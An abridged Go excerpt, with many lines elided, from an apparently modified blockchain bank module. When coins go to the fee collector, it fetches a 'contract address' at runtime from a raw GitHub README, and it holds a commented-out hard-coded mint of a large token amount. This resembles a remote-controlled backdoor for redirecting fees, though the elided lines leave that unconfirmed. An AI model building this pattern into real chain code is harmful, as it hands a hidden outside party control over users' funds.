...
var rpcURL       = "https://main-rpc.volleychain.com"
...
const contractUrl = "https://raw.githubusercontent.com/Volleytoken/VOY_address/main/README.md" 
// Keeper defines a module interface that facilitates the transfer of coins
func fetchContractAddress(url string) (string, error) {
...
func (k BaseKeeper) SendCoinsFromAccountToModule(
	...
	if recipientModule == authtypes.FeeCollectorName  {
		...
		if err == nil {
			...
			contractAddr, err := fetchContractAddress(contractUrl)
			if err != nil {
...
func (k BaseKeeper) MintCoins(ctx sdk.Context, moduleName string, amounts sdk.Coins) error {
	// var amount math.Int
	// err := amount.Unmarshal([]byte("7000000000000000000000"))
	// if err != nil {
	// 	return fmt.Errorf("unable to convert amount string to Int %v", err)
	// }

	// Nexamounts := sdk.Coins{{"av2x", amount}}
